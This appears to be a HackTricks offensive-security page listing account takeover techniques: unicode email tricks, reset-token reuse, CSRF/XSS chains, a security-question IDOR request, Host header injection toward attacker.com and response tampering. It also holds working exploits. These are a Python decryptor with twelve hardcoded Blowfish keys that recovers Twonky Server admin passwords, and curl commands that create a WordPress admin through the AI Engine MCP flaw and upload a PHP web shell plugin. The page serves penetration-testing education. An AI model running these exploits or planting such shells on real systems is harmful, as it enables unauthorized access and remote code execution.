# Account Takeover

{{#include ../banners/hacktricks-training.md}}

## **Authorization Issue**

The email of an account should be attempted to be changed, and the confirmation process **must be examined**. If found to be **weak**, the email should be changed to that of the intended victim and then confirmed.

## **Unicode Normalization Issue**

1. The account of the intended victim `victim@gmail.com`
2. An account should be created using Unicode\
   for example: `vićtim@gmail.com`

As explained in [**this talk**](https://www.youtube.com/watch?v=CiIyaZ3x49c), the previous attack could also be done abusing third party identity providers:

- Create an account in the third party identity with similar email to the victim using some unicode character (`vićtim@company.com`).
  - The third party provider shouldn't verify the email
  - If the identity provider verifies the email, maybe you can attack the domain part like: `victim@ćompany.com` and register that domain and hope that the identity provider generates the ascii version of the domain while the victim platform normalize the domain name.
- Login via this identity provider in the victim platform who should normalize the unicode character and allow you to access the victim account.

For further details, refer to the document on Unicode Normalization:


{{#ref}}
unicode-injection/unicode-normalization.md
{{#endref}}

## **Reusing Reset Token**

Should the target system allow the **reset link to be reused**, efforts should be made to **find more reset links** using tools such as `gau`, `wayback`, or `scan.io`.

## **Pre Account Takeover**

1. The victim's email should be used to sign up on the platform, and a password should be set (an attempt to confirm it should be made, although lacking access to the victim's emails might render this impossible).
2. One should wait until the victim signs up using OAuth and confirms the account.
3. It is hoped that the regular signup will be confirmed, allowing access to the victim's account.

## **CORS Misconfiguration to Account Takeover**

If the page contains **CORS misconfigurations** you might be able to **steal sensitive information** from the user to **takeover his account** or make him change auth information for the same purpose:


{{#ref}}
cors-bypass.md
{{#endref}}

## **Csrf to Account Takeover**

If the page is vulnerable to CSRF you might be able to make the **user modify his password**, email or authentication so you can then access it:


{{#ref}}
csrf-cross-site-request-forgery.md
{{#endref}}

## **XSS to Account Takeover**

If you find a XSS in application you might be able to steal cookies, local storage, or info from the web page that could allow you takeover the account:


{{#ref}}
xss-cross-site-scripting/
{{#endref}}

## **Same Origin + Cookies**

If you find a limited XSS or a subdomain take over, you could play with the cookies (fixating them for example) to try to compromise the victim account:


{{#ref}}
hacking-with-cookies/
{{#endref}}

## **Attacking Password Reset Mechanism**


{{#ref}}
reset-password.md
{{#endref}}

## Security-question resets that trust client-supplied usernames
If an "update security questions" flow takes a `username` parameter even though the caller is already authenticated, you can overwrite any account's recovery data (including admins) because the backend typically runs `UPDATE ... WHERE user_name = ?` with your untrusted value. The pattern is:

1. Log in with a throwaway user and capture the session cookie.
2. Submit the victim username plus new answers via the reset form.
3. Immediately authenticate through the security-question login endpoint using the answers you just injected to inherit the victim's privileges.

```http
POST /reset.php HTTP/1.1
Host: file.era.htb
Cookie: PHPSESSID=<low-priv>
Content-Type: application/x-www-form-urlencoded

username=admin_ef01cab31aa&new_answer1=A&new_answer2=B&new_answer3=C
```

Anything gated by the victim's `$_SESSION` context (admin dashboards, dangerous stream-wrapper features, etc.) is now exposed without touching the real answers.

Enumerated usernames can then be targeted via the overwrite technique above or reused against ancillary services (FTP/SSH password spraying).

## **Response Manipulation**

If the authentication response could be **reduced to a simple boolean just try to change false to true** and see if you get any access.

## OAuth to Account takeover


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

## Host Header Injection

1. The Host header is modified following a password reset request initiation.
2. The `X-Forwarded-For` proxy header is altered to `attacker.com`.
3. The Host, Referrer, and Origin headers are simultaneously changed to `attacker.com`.
4. After initiating a password reset and then opting to resend the mail, all three of the aforementioned methods are employed.

## Response Manipulation

1. **Code Manipulation**: The status code is altered to `200 OK`.
2. **Code and Body Manipulation**:
   - The status code is changed to `200 OK`.
   - The response body is modified to `{"success":true}` or an empty object `{}`.

These manipulation techniques are effective in scenarios where JSON is utilized for data transmission and receipt.

## Change email of current session

From [this report](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea):

- Attacker requests to change his email with a new one
- Attacker receives a link to confirm the change of the email
- Attacker send the victim the link so he clicks it
- The victims email is changed to the one indicated by the attacker
- The attack can recover the password and take over the account

This also happened in [**this report**](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea).


### Bypass email verification for Account Takeover
- Attacker logins with attacker@test.com and verifies email upon signup.
- Attacker changes verified email to victim@test.com (no secondary verification on email change)
- Now the website allows victim@test.com to login and we have bypassed email verification of victim user.

### Old Cookies

As explained [**in this post**](https://medium.com/@niraj1mahajan/uncovering-the-hidden-vulnerability-how-i-found-an-authentication-bypass-on-shopifys-exchange-cc2729ea31a9), it was possible to login into an account, save the cookies as an authenticated user, logout, and then login again.\
With the new login, although different cookies might be generated the old ones became to work again.

## Twonky Server log leak → administrator takeover (CVE-2025-13315/CVE-2025-13316)

Twonky Server 8.5.2 exposes its maintenance logs via `/nmc/rpc/log_getfile` without authentication and logs the last successful administrator login as `accessuser=<username>` followed by an encrypted password field (`||<key_index><hex_ciphertext>`). Because the encryption keys are static, the leak becomes an admin credential recovery primitive:

1. **Fingerprint the build** with an unauthenticated `GET /dev0/desc.xml` request and confirm `<modelNumber>8.5.2</modelNumber>` is returned.
2. **Download the logs** with `GET /nmc/rpc/log_getfile` and parse the newest `accessuser` entry plus the trailing `||` encrypted blob.
3. **Extract the key selector** (the nibble immediately following `||`) and the remainder of the ciphertext. The nibble indexes one of twelve hardcoded Blowfish keys compiled into Twonky.
4. **Decrypt the password** locally and strip trailing null bytes. Twonky stores the credentials as plaintext after the Blowfish operation, so no extra hashing is present.
5. **Log in as admin** over HTTP with the recovered username/password pair to reach all media-server management endpoints.

Typical request to retrieve the leaked logs:

```http
GET /nmc/rpc/log_getfile HTTP/1.1
Host: twonky:9000
```

### Decrypting the leaked password

<details>
<summary>Python Blowfish decryptor</summary>

```python
from Crypto.Cipher import Blowfish

STATIC_KEYS = [
    "E8ctd4jZwMbaV587", "TGFWfWuW3cw28trN", "pgqYY2g9atVpTzjY", "KX7q4gmQvWtA8878",
    "VJjh7ujyT8R5bR39", "ZMWkaLp9bKyV6tXv", "KMLvvq6my7uKkpxf", "jwEkNvuwYCjsDzf5",
    "FukE5DhdsbCjuKay", "SpKNj6qYQGjuGMdd", "qLyXuAHPTF2cPGWj", "rKz7NBhM3vYg85mg"
]

ciphertext = bytes.fromhex(enc_pwd)
key = STATIC_KEYS[int(enc_key_index, 16)]
plain = Blowfish.new(key.encode(), Blowfish.MODE_ECB).decrypt(ciphertext)
print(plain.rstrip(b"\x00").decode())
```

</details>

## WordPress AI Engine MCP unauthenticated admin creation (CVE-2025-11749)

The AI Engine plugin exposes a Model Context Protocol (MCP) API under `/wp-json/mcp/v1/<token>/` that maps JSON-RPC calls directly to privileged WordPress functions. Versions ≤3.1.3 never check authentication, so an attacker can mint an admin account and then abuse the normal plugin-upload workflow for RCE:

1. **Enumerate the MCP token** by fetching `/wp-json/` (or `/?rest_route=/`) and parsing the routes for `/mcp/v1/<token>/sse`.
2. **Create or update an administrator** by POSTing a JSON-RPC request to `/wp-json/mcp/v1/<token>/sse` where `method` is `tools/call`, `params.name` is `wp_create_user` (or `wp_update_user`), and the arguments contain attacker-controlled credentials.
3. **Log in to `/wp-admin/`** with the freshly provisioned account and reuse Plugins → Add New → Upload Plugin to deploy a PHP backdoor.
4. **Activate the plugin** or directly browse to its endpoint to execute commands as the web server user.

Unauthenticated admin creation:

```bash
curl -k -X POST https://target/wp-json/mcp/v1/<token>/sse \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1337,"method":"tools/call","params":{"name":"wp_create_user","arguments":{"user_login":"aiadmin","user_pass":"Passw0rd!","user_email":"attacker@example.com","role":"administrator"}}}'
```

Minimal malicious plugin packaging and upload:

```bash
mkdir ai-shell
cat <<'PHP' > ai-shell/ai-shell.php
<?php
/*
Plugin Name: ai-shell
*/
system($_GET['cmd'] ?? 'id');
PHP
zip -r ai-shell.zip ai-shell
curl -k -b admin.cookie -F "pluginzip=@ai-shell.zip" https://target/wp-admin/update.php?action=upload-plugin
```

## References

- [https://infosecwriteups.com/firing-8-account-takeover-methods-77e892099050](https://infosecwriteups.com/firing-8-account-takeover-methods-77e892099050)
- [https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea)
- [0xdf – HTB Era: security-question IDOR & username oracle](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [Rapid7 – Metasploit Wrap-Up 12/05/2025](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-12-05-2025/)
- [Metasploit module: gather/twonky_authbypass_logleak](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/twonky_authbypass_logleak.rb)
- [Metasploit module: multi/http/wp_ai_engine_mcp_rce](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_ai_engine_mcp_rce.rb)
{{#include ../banners/hacktricks-training.md}}

